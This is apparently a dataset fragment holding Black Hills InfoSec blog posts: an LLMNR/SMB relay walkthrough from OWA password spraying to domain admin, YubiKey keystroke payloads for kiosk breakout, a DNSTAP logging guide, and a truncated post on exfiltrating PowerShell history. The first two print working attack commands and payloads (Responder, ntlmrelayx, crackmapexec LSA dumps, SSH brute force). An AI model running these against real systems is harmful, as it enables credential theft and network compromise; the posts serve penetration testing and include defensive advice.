        "output": "Title: \"An SMB Relay Race - How To Exploit LLMNR and SMB Message Signing for Fun and Profit\"\nTaxonomies: \"Author, External/Internal, How-To, Informational, Jordan Drysdale, LLMNR, Red Team, exploit, How to, Jordan Drysdale, LLMNR, Red Team, SMB Message Signing\"\nCreation Date: \"Mon, 08 Apr 2019 15:57:50 +0000\"\nJordan Drysdale//\n\nThis is basically a slight update and rip off of Marcello\u2019s work out here: https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html\n\n/tl;dr - Zero to DA on an environment through an exposed Outlook Web App (OWA) and a single factor VPN. An overview of the techniques is chopped from further down, and the attack summary, exists twice in this document:\n\nIdentify network systems that do not require SMB message validation\n\nConfigure Impacket\u2019s NTLMrelayx to target those systems\n\nDisable SMB and HTTP request/response poisoning in Responder and launch\n\nWait for creds\n\nWe are approaching the topic of NTLM relay via \u201cSMB authentication poisoned reflection\u201d with something more in mind. We are going to execute this whole thing from zero with nothing but an OWA portal, a list of users, and a smile. \n\nLLMNR, NBNS, NBT-NS - what is what and how do we differentiate from the attacker\u2019s perspective and the defender\u2019s? NBT-NS and NBNS are the same thing and operate on UDP/137 and are also known as NetBIOS and WINS. These services are flawed by design and allow an easy attack path via response races; thus an SMB relay race. \n\nNBNS/NBT-NS (heretofore referred to as NBNS) is a fallback mechanism for name resolution. When a system is unable to identify a destination host IP via standard DNS resolutions, the system will broadcast at layer 2 in the OSI (MAC destination all F\u2019s - FF:FF:FF:FF:FF:FF), a request for someone to aid in the IP to hostname mapping process. This broadcast packet is contained by the subnet and VLAN boundary. This is the moment when an attacker can respond and gain access to credential material. If the fallback request was intended to resolve a file server, the attacker system can present a response and an authentication challenge in subsequent packets, thus gaining access to a victim\u2019s hashed or cleartext password in certain situations.\n\nLLMNR is short for link-layer multicast name resolution and operates almost exactly as described in the long version. This name resolution technique is also a fallback mechanism for systems unable to resolve hostname via standard DNS. The link layer reference in the name keeps the packet on subnet, except in exceptional circumstances, including broadcast forwarding and IGMP PIM configurations, which are way more common when deploying solutions like remote system imaging or tele-casting. The destination MAC address for this request is defined as 01:00:5E:00:00:FC on TCP/5355. The reference to multicast in the protocol defines the destination IP of the resolution request\u2019s packet in the multicast reserved space at 224.0.0.252. Similar to NBNS, LLMNR requests can be compromised by responding to these requests faster than anyone else. Thus, the following screenshot from @krelkci\u2019s blog about turning this off on your network.\n\nSMB message signing is the process of validating the source of requests against a system\u2019s SMB services. When SMB message checks are enforced, the relay attack is rendered ineffective. Via group policy modifications, we can effectively eliminate this risk by enabling the \u201cDigitally sign communications (always)\u201d setting. There have been discussions that this setting can cause an impact to network performance. While we have not tested this under controlled circumstances, if you are considering whether or not this is a risk worth eliminating, you should consider a penetration test from Black Hills Information Security. Our consulting team can build a package just right for your needs; they stand ready to discuss our service options at consulting@blackhillsinfosec.com.\n\nNow, armed with some background knowledge about the protocols, let\u2019s attack our contrived environment first via OWA, in through the VPN, on to a Linux box, and over to the DCs.\n\nAttacks start with reconnaissance. We are skipping over this today. Have fun though, and maybe try these against your own organization. You will likely be terrified by what you find if you invest some effort.\n\nRecon-ng\n\ntheHarvester / InSpy\n\nBurp and LinkedIn\n\nDNSDumpster / DNS UltraTools\n\nMXToolbox\n\nMetadata Tools\n\nCredential Harvesting\n\nPastebin\n\nShodan\n\nData brokerage firm reports (Acxiom, BeenVerified, Epsilon)\n\nAnyway, you want something like the following when you are done running recon.\n\nFor us, we will download MailSniper from here, import it and execute! We used the next command to recover a valid domain account. As usual, if the population is sufficiently large (a few hundred users), and the password policy is weak (8-10 character minimum), recovering credentials is just a matter of time. \n\nInvoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList C:\\users.txt -Password Spring2019! -OutFile .\\creds.txt\n\nWe also went ahead and downloaded the global address list with the following command.\n\nGet-GlobalAddressList -ExchHostname mail.domain.com -UserName wlabv2\\maxine.james -Password Spring2019! -OutFile .\\GAL.txt.\n\nNext, using some interesting hosts we found during DNS recon, we were able to access and download a configuration file for our recovered user account. \n\nAnd we could authenticate! \n\nNote: the OpenVPN client will display networks to which a profile has access. Those networks should be scanned for interesting things.\n\nNow, we run Nmap to find things and score a direct hit. \n\nnmap -p22 --script=ssh-brute.nse --script-args userdb=users.lst,passdb=pass.lst 10.55.100.0/24\n\nThe results demonstrate victory and we have recovered the first flag in this environment and landed a host from which we can stage further attacks against the network. \n\nLet\u2019s discuss SMB relay in the context of LLMNR and why this is such an important vulnerability to not overlook in your scan results. First, the vulnerability is known as \u201cSMB Message Signing Disabled\u201d to Nessus. Because the lab is ours to do with what we will, we scanned it. There were 36 systems discovered with SMB message integrity validation checks disabled.\n\nAs mentioned in Tenable\u2019s vulnerability write-up, this vulnerability allows attackers to conduct MiTM attacks against an identified SMB server. More specifically, this vuln allows an attacker with an inside position to reflect poisoned LLMNR and NBNS request/response pairs toward this list of systems. When the reflected NetNTLMv2 hashes land on systems where the poisoned \u201crequester\u201d has sufficient permissions, the SAM is dumped and new credentials are unlocked. \n\nThe attack, in summary:\n\nIdentify network systems that do not require SMB message validation\n\nConfigure Impacket\u2019s NTLMrelayx to target those systems\n\nDisable SMB and HTTP response poisoning in Responder and launch\n\nWait for creds\n\nThe following screenshot is the result of two commands, all that\u2019s required for this attack. In one window: \n\nntlmrelayx.py -t 10.55.100.190\n\nAnd, in the Responder pane, remember to set SMB and HTTP to \u2018Off\u2019 in the Responder.conf file:\n\n./Responder.py -I eth0 -rdw\n\nIn a matter of minutes, we have the contents of SAM from our targeted system. \n\n\ufffcWhen these vulnerabilities are combined, which is more often than not in the wild, the results can be devastating. In our environment, we now steal resting NTLM hashes and begin the crackmapexec-based pillaging. \n\ncrackmapexec smb 10.55.100.0/24 -u winlab -H \n5120d0cb0df939e3044c5843e37b2c5f --local --lsa\n\nBecause why wouldn\u2019t we run through an entire subnet and dump LSA? As seen below, we capture a couple more users, one of which turned out to be a DA. \n\nWell then. \n\nWhat can you do to reduce these risks? \n\nEnforce SMB Message Integrity checks on all systems (this is only part of solving this problem) via group policy - \u201cDigitally Sign Communications - Always\u201d\n\nReview network systems and DNS configuration specifically\n\nBecause LLMNR and NBNS are fallback mechanisms, a well-configured DNS infrastructure can reduce the need for name lookups over these weak protocols\n\nUpdate your gold system images to include NBNS set to \u201cDisabled\u201d \n\nConfigure group policy preferences that disable NBNS / NetBIOS / WINS on network adapters\n\nConfigure a group policy that disables LLMNR\n\nLimit user privileges on your network as this attack also relies on the reflected NetNTLMv2 \u201cauthenticator\u201d to have sufficient privileges for SMB login\n\nLINKS\n\nhttps://wiki.wireshark.org/NetBIOS/NBNS\n\nhttps://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution\n\nhttps://blogs.technet.microsoft.com/josebda/2010/12/01/the-basics-of-smb-signing-covering-both-smb1-and-smb2/\n\nhttps://www.blackhillsinfosec.com/how-to-disable-llmnr-why-you-want-to/\n\nhttps://github.com/dafthack/MailSniper\n\nhttps://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Weaponize the Yubikey\"\nTaxonomies: \"Author, How-To, Informational, Michael Allen, Red Team, How to, Michael Allen, Payload, Red Team, Rubber Ducky, Scan Codes, Teensy, Weaponize, yubikey\"\nCreation Date: \"Thu, 02 May 2019 16:35:59 +0000\"\nMichael Allen // \n\nA couple of years ago, I had a YubiKey that was affected by a security vulnerability, and to fix the issue, Yubico sent me a brand new YubiKey for free. Since I didn't use the old YubiKey for authentication after receiving the new one, I decided to see if I could turn it into something similar to a USB Rubber Ducky - a USB device that emulates a keyboard and sends a computer a series of pre-programmed keypresses when it is plugged in.\n\nIt turned out that I was able to do just that, and although a stock YubiKey isn't ideal as a USB drop, it's convenient for everyday carry, is often less conspicuous than a flash drive, and has come in handy for me several times as an impromptu way to break out of a kiosk's restricted shell when other tools were not available.\n\nIn this post, I'll explain how I identified all the key presses that could be generated by my stock YubiKey using a US keyboard layout and then crafted payloads using those keys.\n\n Step 1: Download the YubiKey Personalization Tool \n\nYubiKey provides a program on their website called the YubiKey Personalization Tool (YPT) that can be used to customize the different features of the YubiKey on Linux, Windows, or Mac. I'm using the Linux version in this post, but the Windows and Mac versions should work very similarly.\n\nDownload the YubiKey Personalization Tool\n\nIf you use the Linux version as I did, you may need to build the program from the source code provided by YubiKey. Instructions for how to do so are included in the README file that comes with the source code and are easy to follow, so I won't cover them here.\n\n Step 2: Programming the YubiKey with a static password \n\nIn its default configuration, the YubiKey will type a unique authentication token whenever it is used, and that token changes on each use. However, the YubiKey can also be programmed to type in a static, user-defined password instead. Since the YubiKey enters data into the computer just like a regular keyboard, I wanted to find out whether it could be used to press more interesting keys like CTRL, ALT, or the Windows key in addition to the standard letters, digits, and symbols. To test this, I started up the YPT and selected the Static Password option from the bar across the top. Then on the Static Password page, I clicked the button labeled, \"Scan Code\".\n\nTo understand how everything worked, I started by programming the YubiKey with the very simple static password, \"abcdef\". To do that, I selected the following options in the Static Password window: \n\nConfiguration Slot: Configuration Slot 1\n\nKeyboard: US Keyboard\n\nPassword: abcdef\n\nI noticed that while I was typing my password into the Password field, hexadecimal values started showing up in the Scan Codes field to its right. I took note of that and decided that my next step after programming the YubiKey with a static password should be to identify the hexadecimal value for every key I wanted to type. That way I might be able to program it with keypresses that I couldn't type into the password field - keys like CTRL and ALT.\n\nThe following screenshot shows all the settings I outlined above and the scan codes that were generated by typing in my password:\n\nNext, I clicked \"Write Configuration\" to write the static password to my YubiKey. When doing this for the first time, a dialog box popped up asking me to confirm that I wanted to overwrite the current configuration of Slot 1 on my YubiKey. I checked the box labeled, \"Don't show this message again,\" and clicked Yes to write the changes to the device.\n\nWARNING: If you're following along with your own YubiKey, make sure it's one you're not currently using for authentication. Writing the new configuration to the YubiKey will erase the settings stored in the Configuration Slot you select, and you'll have to reprogram your YubiKey and re-register it with the services you use to use it for multi-factor authentication again. If you use only one Configuration Slot on the YubiKey for authentication, you can probably overwrite the other one safely. But if you're unsure, it might be best to either unregister your YubiKey from any services you use first or to just use a different YubiKey.\n\nAfter writing the changes, I opened a text editor and pressed the hardware button on the YubiKey. The YubiKey typed the password, \"abcdef,\" on the screen as expected.\n\n Step 3: Identifying YubiKey's hexadecimal key codes \n\nNow that I had confirmed I could get the YubiKey to enter a series of predefined keys, the next thing I wanted to do was figure out whether I could make it press more interesting keys by specifying hexadecimal \"Scan Codes\" in the YPT. To start mapping scan codes to their corresponding key presses, I started with the very low-tech approach of typing the letters \"a\" through \"z\" into the Password field of the YPT and observing the results in the Scan Codes field. This resulted in the hexadecimal values 04 through 1D appearing in the Scan Codes field.\n\nI repeated this process for all the other printable keys on my keyboard, as well as the uppercase version of each. I made a note of all the hex values I collected and of the ranges of values that I hadn't yet matched to a key on the keyboard. I organized all the characters I was able to decode into a table, and after doing so, I noticed a pattern. It appeared that the scan codes were divided down the middle, with the lowercase characters all located between 00-7F and the uppercase, or \"key + Shift,\" versions present in the same location between 80-FF. This can be seen more clearly in the table below.\n\nNow all that was left to do was identify the keypresses generated by the hex values in each unknown range. Because typing the hex values into the Scan Codes field in YPT didn't display any output, and because I expected many of the keys pressed in the unknown ranges to be keys that didn't generate any printable output (e.g. the CTRL key), I needed a way to capture the raw keypresses generated by the YubiKey. For this, I decided to use the Linux tool, xinput, and my xinput-keylog-decoder script to decode the output.\n\nIf you're not familiar with xinput, it is a command-line tool that's commonly included in many Linux distributions along with the graphical desktop environment. It's also commonly abused as a keylogger when those systems are compromised, and I created the xinput-keylog-decoder tool for that purpose.\n\nSince the YubiKey is essentially a keyboard, the first thing I did to start capturing its keypresses was to identify its ID number within xinput. I checked this by running the xinput command without any arguments and determined that its ID was 16 as shown in the output below.\n\nBy default, the example script that comes with xinput-keylog-decoder logs input from all keyboards attached to the system, but knowing the ID of the YubiKey let me target that device specifically when parsing the output.\n\nNext, I opened three terminal windows and ran commands to log and analyze the keypresses generated by the YubiKey. An explanation of the purpose of each command follows the screenshot below.\n\nTop terminal: Stop any currently running xinput processes, start a new xinput process, and start an infinite loop to read input from the keyboard. This is the terminal window I kept selected while the YubiKey typed keys into the system. That way anything it typed wouldn't interfere with the other terminal windows.\n\n./stop-logging.sh >0; rm *txt; ./start-logging.sh; while true; do read; sleep 0.1; done\n\nMiddle terminal: Display the raw output of test-output.16.txt on-screen every one second. test-output.16.txt is the file where keypresses from keyboard ID 16 were automatically saved. Displaying the raw key codes output by xinput allowed me to get more information in case xinput-keylog-decoder.py failed to decode a keypress in the third terminal window.\n\nwatch -n 1 tail test-output.16.tx\n\nBottom terminal: Every second, decode the keylog file and display it as human-friendly text.\n\nwatch -n 1 ./xinput-keylog-decoder.py test-output.16.txt\n\nFinally, when programming the hexadecimal scan codes into the YubiKey, I started by entering them between two known characters - usually \"a\" (scan code 04) and \"b\" (scan code 05). This way I could confirm that the keys before and after the target key press were actually pressed, and it allowed me to identify whether the keypress had any effect on those other keys. Below is an example of this process while targeting the scan code, \"2A\".\n\nIn the first screenshot, you can see the unidentified scan code, \"2A\", sandwiched between the scan codes for \"a\" and \"b\". You might also notice the apparent blank space between \"a\" and \"b\" in the password field.\n\nIn the next screenshot, I selected the top terminal and pressed the button on my YubiKey. At first glance, it appears that only the \"b\" key was pressed and the \"a\" was omitted. However, after examining the middle window, you can see that three keys were each pressed and released in succession. In the third window, the key codes from the middle window are decoded into a human-friendly format, and it's clear that the keys pressed were \"a\", the backspace key, and \"b\". This explains why \"a\" didn't appear in the first window and identifies the target scan code, \"2A\", as the backspace key.\n\nAfter identifying a key this way, all I did next was press CTRL+C to stop the running loop in the top window, run the command again (to clear the log and restart the logger), and then repeat the process above. After repeating these steps for every unidentified hex value, I confirmed the keypresses generated by every possible scan code and collected them in the table below.\n\nWhile decoding the scan codes, I also observed that the YubiKey will automatically press the Enter key at the end of some sequences of key presses. In some cases, I was able to prevent this behavior by terminating the sequence with the scan code, \"00\", but it didn't always work. To demonstrate, here is a screenshot of the YubiKey being configured to type the letters \"a\" through \"z\" and a screenshot of the output once the YubiKey's button is pressed. Note that the \"z\" key (scan code \"1D\") was the last key programmed into the YubiKey, but the YubiKey pressed Enter at the end of the string anyway. This is different than the behavior observed when decoding the code for the backspace key in the previous example, where the Enter key was not pressed.\n\nBoth the length of the key-press sequence and the YubiKey's output speed (configurable from the Settings screen in YPT) appear to affect this behavior. In my testing, the extra Enter key didn't appear in sequences less than 23 keys long that were typed at the standard output character rate. However, slowing the character rate by 60 ms caused the Enter key to be automatically pressed on sequences as short as one keypress. Watch out for this when creating payloads on your YubiKey if you don't want it to automatically press Enter at the end.\n\n Step 4: Creating useful payloads \n\nWith all of the scan codes matched to the keys they press, I was now ready to start building payloads. Unfortunately, none of the scan codes I tested pressed the CTRL, ALT, or Windows keys I had hoped to find; so while it could be used to type in a long one-liner, it was not ideal as a fully-automated command injection tool or USB drop like a Rubber Ducky or Teensy.\n\nEven though the YubiKey won't press CTRL, ALT, or the Windows key, it still has access to several other potentially interesting keys, including:\n\nShift (By using one of the \"Shift + No effect\" scan codes)\n\nFunction Keys (F1-F12)\n\nMenu Key (equivalent of a mouse right-click)\n\nEscape\n\nThe Shift key in combination with all the identified keys\n\nAlthough these keys might not be preferred for injecting an executable payload into a target system, one scenario where they are extremely helpful is when trying to break out of the restricted shell of a computer kiosk.\n\nBecause of the difficulty in fully securing kiosk software, kiosk makers often physically remove keys from keyboards, right-click buttons from pointing devices, or completely remove both devices in favor of a touch screen. But it's not uncommon for USB ports on the kiosk to remain exposed so technicians can attach their own keyboards for troubleshooting. In that scenario, an attacker armed with a keyboard of their own (or in this case, a YubiKey) can just plug their keyboard into the kiosk and use one of many well-known methods to break out of the restricted shell and take control of the computer.\n\nThe first step in escaping from a restricted shell on a kiosk is often just opening a new application window - be it a dialog box, a new browser window, or anything else. And this is often the step where a keyboard is most helpful since the rest of the attack can usually be done with minimal input from a pointing device. The table below describes key presses the YubiKey can inject to attempt to execute that first step.\n\nKey PressesImpact on the Computer KioskEscapeExits the current windowPress Shift five timesOpens Windows' Sticky Keys dialog boxF1Opens the Help dialog on many applications and operating systemsF6Selects the web browser address barF10, Down ArrowOpens the application menu in many applicationsF10, Down Arrow, \"n\"Opens a new window in Chrome, Firefox, and Windows ExplorerF10, Down Arrow, \"p\"Opens the print dialog in many applicationsF11Exits full-screen mode. May reveal a web browser's address barF12, EscOpens web developer tools and selects the JavaScript consoleShift + F10Right-click with the mouse. Opens the shortcut menuShift + MenuShift + right-click. Opens the shortcut menu with extended options to run command prompt or PowerShell in Windows ExplorerOther Function Keys (F1-F12)Extra functionality in many applications. Hidden features/menus in some kiosk softwarePrint ScreenOpens a screenshot dialog on some systems\n\nWith these functions in mind, I created the three payloads below to use my YubiKey as a kiosk break-out device.\n\n YubiKey Payloads \n\nPayload 1 - Simple function key and Sticky Keys test\n\nScan codes: 522c3a3b3c3d3e3f404142434445e6e6e6e6e6e652\n\nOutput character rate: Standard\n\nKey presses executed:\n\nActivate hyperlink in Sticky Keys dialog if present: Up arrow, Space bar\n\nPress each function key: F1, F2, F3, F4, F5, F6, F7, F8, F9, F10, F11, F12\n\nOpen the Sticky Keys dialog by pressing Shift five times, plus one to be safe: Shift, Shift, Shift, Shift, Shift, Shift\n\nSelect the hyperlink in the Sticky Keys dialog and attempt to block the Enter key from closing the window if it is pressed: Up arrow\n\nPayload 2 - Browser hotkeys and Sticky Keys\n\nScan codes: 3f2a06b3a83f4dca06b3283c443e3b3d40ab2c29e5115128454142435113113ae6e6e6e6e652\n\nOutput character rate: Slow down by 60 ms\n\nKey presses executed:\n\nOpen \"c:\" in a new browser window: F6, Backspace, Type \"c:\", Shift+Enter\n\nOpen \"c:\" (Chrome): F6, End, Shift+Home, \"c:\", Enter\n\nPress function keys: F3, F11, F5, F2, F4\n\nTry F7 and close the dialog box if one appears: F7, Shift+Tab, Space, Esc\n\nOpen a new browser window: Shift+Menu, n, Down, Enter\n\nTry F12/Web developer console: F12\n\nTry F8 and F9: F8, F9\n\nOpen the print dialog or a new browser: F10, Down, p, n\n\nTry F1/Help: F1\n\nOpen the Sticky Keys dialog: Shift, Shift, Shift, Shift, Shift\n\nPrevent the Enter key from closing the Sticky Keys dialog: Up\n\nPayload 3 - Shift+Right Click\n\nScan codes: e5\n\nOutput character rate: Standard\n\nKey presses executed: Shift+Menu key\n\nThe first payload is very simple: it presses the up arrow, the space bar, each function key (F1-F12), and then presses the Shift key six times before pressing the up arrow again. The purpose of this payload is to test each function key to see if it provides a way to access additional functionality on the kiosk, and then press the Shift key repeatedly to open the Sticky Keys dialog box. Once the Sticky Keys dialog is open, the button on the YubiKey can be pressed a second time, and the up arrow and space bar key presses will open the hyperlink in the dialog box to navigate to Windows' Ease of Access settings. This was the first payload I created for the YubiKey, and it's been very successful at breaking out of restricted shells on multiple platforms in the field.\n\nThe second payload is an attempt to improve on the first by adjusting the use of the function keys to reflect their functions in common web browsers. For example, it doesn't make sense to press F7 and then immediately try F8 because pressing F7 in most browsers causes a prompt to appear, effectively blocking F8 from being pressed in the context of the browser. Every function key is still pressed, along with the Sticky Keys sequence, as in the first payload. Additional keys are included to attempt to automatically select menu options and provide browser cross-compatibility. This payload is a new one that I put together while writing this article, so it hasn't been used in the field yet. It's worked well in a lab environment so far - especially when run more than once.\n\nFinally, the third payload just presses Shift plus the Menu key. This is effectively the same thing as holding the Shift key and right-clicking with the mouse. It gives me the ability to add a right mouse button to the kiosk so I can right-click on different things once I get an initial foothold. It also provides a quick shortcut to PowerShell or a command prompt if I can right-click inside an Explorer window. I usually keep this payload in Slot 2 on my YubiKey, with one of the other payloads in Slot 1.\n\nConclusion \n\nAlthough the YubiKey is an excellent two-factor authentication device, it's definitely missing a few features that would make it an ideal USB HID attack tool, and there are other products that already do the job much better. Probably the main strength of the YubiKey as an attack tool is that it looks like a YubiKey. In high-security environments where flash drives are not allowed, it might be possible to smuggle in a YubiKey; and in close-up social engineering scenarios, it might be easier to convince an employee to open up the cabinet of a public Internet kiosk so you can \"authenticate\" to your email account than it would be to plug in some unrecognized device.\n\nIn my mind, that's the main takeaway from experimenting with the YubiKey. With a little bit of effort and a relatively small amount of technical know-how, even trusted electronic devices can be made into tools of attack.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Tap Into Your Valuable DNS Data\"\nTaxonomies: \"Author, Blue Team, DNSTAP, How-To, Informational, Joff Thyer, Recon, Red Team, BIND, DNS, DNSTAP, Farsight Security, Joff Thyer, Logging, Paul Vixie\"\nCreation Date: \"Mon, 03 Jun 2019 15:21:48 +0000\"\nJoff Thyer //\n\nThe Domain Name System (DNS) is the single most important protocol on the Internet. The distributed architecture of DNS name servers and resolvers has resulted in a resilient and highly scalable system that is largely unchanged from the early days of NSFNET. It is a unique solution that allows domain holders to manage their own zone data while still being linked into the global hierarchy of distribution Internet domains across the world.  \n\nIn the security context, knowing what our client systems are looking up in the DNS yields valuable information about normal versus abnormal operations in any environment.   \n\nNearly all organizations will run recursive DNS servers within their environments and almost all communications that your internal client stations engage in are likely to be preceded by one or more DNS lookup requests.   \n\nLogging these requests and responses must be viewed as a necessity as it represents a valuable source of data for both security and operational analysis.\n\nHaving said that, logging the data is where things get a little tricky. The challenge is this, most DNS name servers for even a modest-sized organization are subject to considerable network load. They are constantly bombarded with requests and are rightfully implemented as multi-threaded high-performance code.\n\nAn internal Microsoft domain controller name server has a feature to \u201cenable debug logging\u201d however it is not recommended to keep it enabled. The reason is that the continuous file I/O operations to write out the log data will slow things down. Any disk write operation is subject to kernel buffers, and associated wait time for the I/O buffers to be flushed to disk.  \n\nThe Internet Software Consortium\u2019s BIND server has had a logging feature within the configuration for some time, however, the same issue applies. Enabling this feature will slow things down as the server writes out logging information to disk.\n\nFor a small network with about a half dozen endpoints (like my network at home), you probably don\u2019t really care or would even notice the penalty of logging DNS requests with synchronous file I/O. In larger environments, enabling such logging features will impact overall server performance to the detriment of internal users. Furthermore, within the DNS code threads, if there is a choice between servicing a new DNS request, versus writing buffered log information to disk, the DNS requests will likely be serviced as a priority and log entries may well be lost.\n\nOne possible solution is to deploy additional systems, such as a Bro sensor or full packet capture solution to listen to network data. This will typically involve mirroring data with a network SPAN port configuration or dedicated optical tap upstream of the DNS server. Clearly, such a solution involves additional expense and complexity.  Why not just collect the data directly from the source DNS server?\n\nDNSTAP\n\nDNSTAP, proposed by Farsight Security solves the I/O performance bottleneck yielding valuable logging information directly from the DNS server itself. DNSTAP logs query and response information in a flexible binary structured log format using Google\u2019s protocol buffer implementation. \n\nThe architecture diagram from http://dnstap.info gives a sense of the logical components of DNSTAP. In short, there is an encoding of a copy of the DNS data itself which is then serialized to a reliable byte stream by the sender (DNS server). The resulting serialized data can be read by receiver software and logged to file if needed. \n\nBy separating the DNSTAP byte stream I/O from the DNS server operation itself solves the slow logging I/O problem and yields a great deal of granularity given that the resulting data is the actual DNS requests and responses themselves.\n\nDNSTAP is available for Bind, Unbound, and the Knot server implementations. For the remainder of this blog, I am going to focus on the BIND server implementation.\n\nAfter listening to Paul Vixie speak about DNSTAP at Wild West Hackin\u2019 Fest, and after some additional research, I decided to enable DNSTAP in my home office network. In my case, I am running an Ubuntu 18.04 based router gateway, and DNS server.\n\nThe first discovery I made was that the latest Ubuntu 18.04 patched distribution of BIND did not have the DNSTAP code compiled into the distribution. This is going to require manually building the ISC BIND server from source.\n\nBefore compiling it, an Ubuntu system with the appropriate source code build tools installed will be needed. Preferably this should not be the target system for final installation!\n\nsudo apt update\nsudo apt install build-essential libtool autoconf automake libssl-dev\n\nAdditionally, DNSTAP depends upon Google protocol buffers, the protocol file compiler, and the related frame stream tools. These items are actually available from the Ubuntu repositories although you might choose to compile them for the latest/greatest code. Using the Ubuntu repositories, I installed these as follows:\n\nsudo apt install libprotobuf-c-dev libprotobuf-c1\nsudo apt install protobuf-c-compiler\nsudo apt install fstrm-bin libfstrm0 libfstrm-dev libfstrm0-dbg\n\nAlthough the frame stream tool is available from Ubuntu\u2019s repositories if you want the latest software you might consider visiting Farsight\u2019s GitHub repository and cloning the source from there for building.\n\ngit clone https://github.com/farsightsec/fstrm.git\ncd fstrm\n./autogen.sh\n./configure\nmake\nsudo make install\n\nOnce you have the dependencies installed, you should download the latest source code for BIND. I chose Bind 9.14 as it has the code for DNSTAP included and considered a current/stable release as of today\u2019s date.\n\nwget ftp://ftp.isc.org/isc/bind9/cur/9.14/bind-9.14.2.tar.gz\ntar -xzf bind-9.14.2.tar.gz\ncd bind-9.14.2\n./configure --enable-dnstap --sysconfdir=/etc/bind --localstatedir=/ \n--enable-threads --enable-largefile --with-libtool --enable-shared \n--enable-static --with-gnu-ld --enable-dnsrps --prefix=/usr/local\nmake\nsudo make install\n\nAt this point, you would probably be wise to remove the Ubuntu BIND distribution so that there is no confusion as to which version of the \u201cnamed\u201d binary you are using for DNS.\n\nsudo dpkg --remove bind9\n\nCapturing the Frame Stream\n\nFor optimal results, you want your BIND name server to write its logging information to a UNIX socket and then use the frame stream capture program to read that socket and create a log file in the binary protocol buffers format. Subsequently, you can use a program called \u201cdnstap-read\u201d, included in the BIND distribution to read the binary format and produce readable output as needed.\n\nIt is important to start the frame stream capture process before BIND so that the UNIX socket will be created for you. I opted to first experiment with the command-line options, and then ultimately created a systemd service to ensure that the \u201cfstrm_capture\u201d binary was always started before BIND. My available logging disk space was limited so I decided to rotate the output logging file on a daily basis using 86,400 seconds as the rotate/split parameter.\n\nSystemd Configuration File saved as \u201c/lib/systemd/system/framestream.service\u201d\n\nAs can be seen above, when this service is started the UNIX socket named \u201cdnstap.sock\u201d is created in the \u201c/var/cache/bind\u201d directory.\n\nConfiguring BIND\n\nThe BIND configuration is very straight forward and requires only two lines of configuration in the \u201coptions\u201d section of the name server configuration file. It should be noted that DNSTAP configuration options include different message types of data that can be logged. In each case, you can optionally specify \u201cquery\u201d or \u201cresponse\u201d.  If you don\u2019t specify \u201cquery\u201d or \u201cresponse\u201d then both are logged by default.\n\nThe message types are:\n\nAuth\n\nQuery received from a resolver by an authoritative name server. Response sent will be from an authoritative name server. These queries/responses from the perspective of the authoritative name server.\n\nClient\n\nQuery sent from a client (or stub resolver) to a name server. The name server is expected to perform a recursive lookup and send the response back to the client.\n\nResolver\n\nQuery sent from another resolver to an authoritative name server from the perspective of the resolver. Response message received from an authoritative name server by a resolver from the perspective of the resolver.\n\nForwarder\n\nDNS traffic sent/received and forward to/from downstream and upstream DNS servers.\n\nI decided for my configuration to focus on both client and authoritative traffic. Including the resolver message type can be a little noisy. How you approach the configuration really depends upon your goals. My BIND configuration file \u201coptions\u201d section is shown below for reference.\n\nRead and Analyze the Logging Data\n\nThe ISC BIND distribution includes a program called \u201cdnstap-read\u201d which allows the user to read data from the binary structured protocol buffer file, and print it to screen. There are several useful options that can be used with \u201cdnstap-read\u201d.\n\nIf you don\u2019t specify any options, then \u201cdnstap-read\u201d will simply read the current log and print all of the associated requests/responses in the log along with an additional code indicating what sort of message type is logged. Message types as extracted from the protocol buffer definition file can be:\n\nAUTH_QUERY (AQ)\n\nAUTH_RESPONSE (AR)\n\nRESOLVER_QUERY (RQ)\n\nRESOLVER_RESPONSE (RR)\n\nCLIENT_QUERY (CQ)\n\nCLIENT_RESPONSE (CR)\n\nFORWARDER_QUERY (FQ)\n\nFORWARDER_RESPONSE (FR)\n\nSTUB_QUERY (SQ)\n\nSTUB_RESPONSE (SR)\n\nTOOL_QUERY (TQ)\n\nTOOL_RESPONSE (TR)\n\nSample Output from \u201cdnstap-read\u201d\n\nFor extra detail, you can print the full DNS message using \u201c-p\u201d which yields a \u201cdig\u201d like output with all of the expected detail. Both a YAML (-y), and hexadecimal dump (-x) form of the data is also available. In all cases, the original single line output, as shown above, is also included.\n\nSample Output using the \u201c-p\u201d Flag of Single Query/Response\n\nSince reading and learning all about DNSTAP, I have taken the extra step of starting a Python3 implementation that can parse the frame stream log forward, read the data in much the same way as \u201cdnstap-read\u201d but additionally produce some statistics. You can find my work here at https://github.com/yoda66/DNSTAP-FrameStream-Python.\n\nAll credit due to Paul Vixie and the Farsight Security team for continuing to spread the word about DNSTAP with the ability to collect valuable DNS data in a scalable fashion for further analysis.\n\nReferences:\n\nhttps://www.youtube.com/watch?reload=9&v=OxFFTxJv1L4\n\nhttps://www.vanimpe.eu/2018/12/27/dnstap-for-improved-dns-logging-on-ubuntu/\n\nhttp://dnstap.info/Tutorials/NANOG60/\n\nhttps://github.com/farsightsec\n\nhttps://github.com/yoda66/DNSTAP-FrameStream-Python\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Check-LocalAdminHash & Exfiltrating All PowerShell History\"\nTaxonomies: \"Author, Beau Bullock, How-To, Informational, Red Team, Red Team Tools, Beau Bullock, Check-LocalAdminHash, Invoke-TheHash, PowerShell, PowerView, PSReadline, TL;DR\"\nCreation Date: \"Wed, 05 Jun 2019 21:30:27 +0000\"\nBeau Bullock //\n\nTL;DR\n\nCheck-LocalAdminHash is a new PowerShell script that can check a password hash against multiple hosts to determine if it\u2019s a valid administrative credential. It also has the ability to exfiltrate all PowerShell PSReadline console history files from every profile on every system that the credential provided is an administrator of. \n\nGet Check-LocalAdminHash here: https://github.com/dafthack/Check-LocalAdminHash\n\nHistory Buff\n\nOn a recent assessment, I wanted to gather all the PowerShell console history files (PSReadline) from every system on the network. The PSReadline console history is essentially the PowerShell version of bash history. Since PowerShell version 5 everything you type into a PowerShell terminal gets logged to a file on disk. It can include so many interesting things that people type into their terminals including passwords and other sensitive information. I first learned about these history files from Chris Truncer during one of his amazing training courses. \n\nOn this particular assessment, I had a local admin hash that I knew was in widespread use in the environment. I did not have the cleartext 